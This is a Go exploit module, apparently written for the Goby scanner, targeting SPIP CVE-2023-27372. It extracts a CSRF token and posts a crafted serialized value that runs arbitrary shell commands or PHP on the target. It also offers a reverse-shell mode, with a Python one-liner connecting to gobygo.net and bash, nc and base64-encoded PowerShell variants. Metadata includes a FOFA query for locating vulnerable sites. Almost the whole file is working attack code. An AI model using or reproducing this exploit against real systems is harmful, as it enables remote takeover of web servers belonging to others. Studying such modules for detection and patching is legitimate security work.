package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "SPIP /spip.php Code Execution Vulnerability(CVE-2023-27372)",
    "Description": "<p>SPIP is a publishing system for the Internet.</p><p>SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.</p>",
    "Product": "SPIP",
    "Homepage": "http://www.spip.net/",
    "DisclosureDate": "2023-03-01",
    "PostTime": "2024-06-21",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "header=\"Composed-By: SPIP\" && body=\"spip.php\"",
    "GobyQuery": "header=\"Composed-By: SPIP\" && body=\"spip.php\"",
    "Level": "3",
    "Impact": "<p>An attacker can exploit this vulnerability to remotely execute arbitrary code.</p>",
    "Recommendation": "<p>We recommend that you update your current system or software to the latest version to fix the vulnerability.</p>",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27372",
        "https://avd.aliyun.com/detail?id=AVD-2023-27372"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,eval",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "eval",
            "type": "input",
            "value": "<?php echo('hello,world');?>",
            "show": "attackType=eval"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "Command Execution"
    ],
    "VulType": [
        "Command Execution",
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-27372"
    ],
    "CNNVD": [
        "CNNVD-202302-2404"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "SPIP /spip.php 远程代码执行漏洞（CVE-2023-27372）",
            "Product": "SPIP",
            "Description": "<p>SPIP是SPIP的一个用于创建 Internet 站点的免费软件。&nbsp;</p><p>SPIP 4.2.1之前版本存在安全漏洞，该漏洞源于序列化处理不当，攻击者利用该漏洞可以远程执行代码。<br></p>",
            "Recommendation": "<p>建议您更新当前系统或软件至最新版，完成漏洞的修复。<br></p>",
            "Impact": "<p>攻击者利用该漏洞可以远程执行任意代码。<br></p>",
            "VulType": [
                "代码执行",
                "命令执行"
            ],
            "Tags": [
                "代码执行",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "SPIP /spip.php Code Execution Vulnerability(CVE-2023-27372)",
            "Product": "SPIP",
            "Description": "<p>SPIP is a publishing system for the Internet.<br></p><p>SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.<br></p>",
            "Recommendation": "<p>We recommend that you update your current system or software to the latest version to fix the vulnerability.<br></p>",
            "Impact": "<p>An attacker can exploit this vulnerability to remotely execute arbitrary code.<br></p>",
            "VulType": [
                "Command Execution",
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10962"
}`
	setPayloadRequestHash6745 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		//csrf token获取
		url2 := "/spip.php?page=spip_pass"
		commandResult := ""
		makeGetRequest := httpclient.NewGetRequestConfig(url2)
		makeGetRequest.VerifyTls = false
		makeGetRequest.Timeout = 10
		makeGetRequest.FollowRedirect = false
		csrftoken := "no"
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeGetRequest); err == nil {
			respRawBody := resp.RawBody
			re := regexp.MustCompile(`name='formulaire_action_args((.|\n)*?)value='((.|\n)*?)'`)
			matches := re.FindStringSubmatch(respRawBody)
			if len(matches) > 1 {
				csrftoken = matches[3]
			}
		}
		if csrftoken != "no" {
			makeRequest := httpclient.NewPostRequestConfig(url2)
			makeRequest.VerifyTls = false
			makeRequest.Timeout = 10
			makeRequest.FollowRedirect = false
			makeRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			byteLength := len(command)
            command=url.QueryEscape(command)
			data := `page=spip_pass&formulaire_action=oubli&formulaire_action_args=` + csrftoken + `&oubli=s:` + strconv.Itoa(byteLength) + `:"` + command + `";&nobot=`
			makeRequest.Data = data
			if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
				respRawBody := resp.RawBody
				re := regexp.MustCompile(`id='oubli' value="s:[0-9]*:"((.|\n)*?)";" autocapitalize="off"`)
				matches := re.FindStringSubmatch(respRawBody)
				if len(matches) > 1 {
					commandResult := matches[1]
					return commandResult, url2, nil
				}
			}
		}
		err := errors.New("no match found")
		return commandResult, url2, err
	}
  setPayloadRequestHash6634 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		//csrf token获取
		url2 := "/spip.php?page=spip_pass"
		commandResult := ""

		makeGetRequest := httpclient.NewGetRequestConfig(url2)
		makeGetRequest.VerifyTls = false
		makeGetRequest.Timeout = 10
		makeGetRequest.FollowRedirect = false
		csrftoken := "no"
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeGetRequest); err == nil {
			respRawBody := resp.RawBody
			re := regexp.MustCompile(`name='formulaire_action_args((.|\n)*?)value='((.|\n)*?)'`)
			matches := re.FindStringSubmatch(respRawBody)
			if len(matches) > 1 {
				csrftoken = matches[3]
			}
		}
		if csrftoken != "no" {
			makeRequest := httpclient.NewPostRequestConfig(url2)
			makeRequest.VerifyTls = false
			makeRequest.Timeout = 10
			makeRequest.FollowRedirect = false
			makeRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
      command=`<?php system('`+command+`');?>`
			byteLength := len(command)
      command=url.QueryEscape(command)
			data := `page=spip_pass&formulaire_action=oubli&formulaire_action_args=` + csrftoken + `&oubli=s:` + strconv.Itoa(byteLength) + `:"` + command + `";&nobot=`
			makeRequest.Data = data
			if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
				respRawBody := resp.RawBody
				re := regexp.MustCompile(`id='oubli' value="s:[0-9]*:"((.|\n)*?)";" autocapitalize="off"`)
				matches := re.FindStringSubmatch(respRawBody)
				if len(matches) > 1 {
					commandResult := matches[1]
					return commandResult, url2, nil
				}
			}
		}
		err := errors.New("no match found")
		return commandResult, url2, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash6745

			text := goutils.RandomHexString(16)
			encoded := base64.StdEncoding.EncodeToString([]byte(text))
			pocCommand := `<?php echo(base64_decode('` + encoded + `'));?>`
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash6634
      runPayloadt := setPayloadRequestHash6745

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}
			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)
        

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
 
				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
      case "eval":
        command := goutils.B2S(ss.Params["eval"])
        Result, _, err := runPayloadt(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
 
				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
